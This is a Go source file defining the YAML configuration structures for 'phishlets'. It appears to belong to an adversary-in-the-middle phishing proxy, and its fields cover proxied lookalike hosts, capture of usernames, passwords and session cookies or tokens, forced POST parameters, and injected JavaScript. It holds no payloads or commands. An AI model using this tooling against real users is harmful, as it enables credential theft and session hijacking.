package phishlet

// rawPhishlet is the top-level YAML structure for a phishlet file.
// All fields use yaml tags. Unknown fields cause an error (KnownFields mode).
type rawPhishlet struct {
	Name        string         `yaml:"name"`
	Author      string         `yaml:"author"`
	Version     string         `yaml:"version"`
	ProxyHosts  []rawProxyHost `yaml:"proxy_hosts"`
	SubFilters  []rawSubFilter `yaml:"sub_filters"`
	AuthTokens  []rawAuthToken `yaml:"auth_tokens"`
	Credentials rawCredentials `yaml:"credentials"`
	Login       rawLogin       `yaml:"login"`
	ForcePosts  []rawForcePost `yaml:"force_post"`
	Intercepts  []rawIntercept `yaml:"intercept"`
	JSInjects   []rawJSInject  `yaml:"js_inject"`
}

type rawProxyHost struct {
	PhishSub       string `yaml:"phish_sub"`
	OrigSub        string `yaml:"orig_sub"`
	Domain         string `yaml:"domain"`
	IsLanding      bool   `yaml:"is_landing"`
	AutoFilter     *bool  `yaml:"auto_filter"`     // pointer so we can detect missing vs false
	UpstreamScheme string `yaml:"upstream_scheme"` // "http" or "https" (default: "https")
}

type rawSubFilter struct {
	Hostname  string   `yaml:"hostname"`
	MimeTypes []string `yaml:"mime_types"`
	Search    string   `yaml:"search"`
	Replace   string   `yaml:"replace"`
}

type rawAuthToken struct {
	Type   string        `yaml:"type"` // "cookie" (default) | "body" | "header"
	Domain string        `yaml:"domain"`
	Keys   []rawTokenKey `yaml:"keys"`
}

type rawTokenKey struct {
	Name     string `yaml:"name"`
	Search   string `yaml:"search"` // for body tokens
	Required bool   `yaml:"required"`
	HTTPOnly bool   `yaml:"http_only"`
	Always   bool   `yaml:"always"`
}

type rawCredentials struct {
	Username rawCredRule     `yaml:"username"`
	Password rawCredRule     `yaml:"password"`
	Custom   []rawCustomCred `yaml:"custom"`
}

type rawCredRule struct {
	Key    string `yaml:"key"`
	Search string `yaml:"search"`
	Type   string `yaml:"type"` // "post" | "json"
}

type rawCustomCred struct {
	Name        string `yaml:"name"`
	rawCredRule `yaml:",inline"`
}

type rawLogin struct {
	Domain string `yaml:"domain"`
	Path   string `yaml:"path"`
}

type rawForcePost struct {
	Path       string              `yaml:"path"`
	Conditions []rawForcePostCond  `yaml:"conditions"`
	Params     []rawForcePostParam `yaml:"params"`
}

type rawForcePostCond struct {
	Key    string `yaml:"key"`
	Search string `yaml:"search"`
}

type rawForcePostParam struct {
	Key   string `yaml:"key"`
	Value string `yaml:"value"`
}

type rawIntercept struct {
	Path        string `yaml:"path"`
	BodySearch  string `yaml:"body_search"`
	Status      int    `yaml:"status"`
	ContentType string `yaml:"content_type"`
	Body        string `yaml:"body"`
}

type rawJSInject struct {
	TriggerDomain string `yaml:"trigger_domain"`
	TriggerPath   string `yaml:"trigger_path"`
	Script        string `yaml:"script"`
}
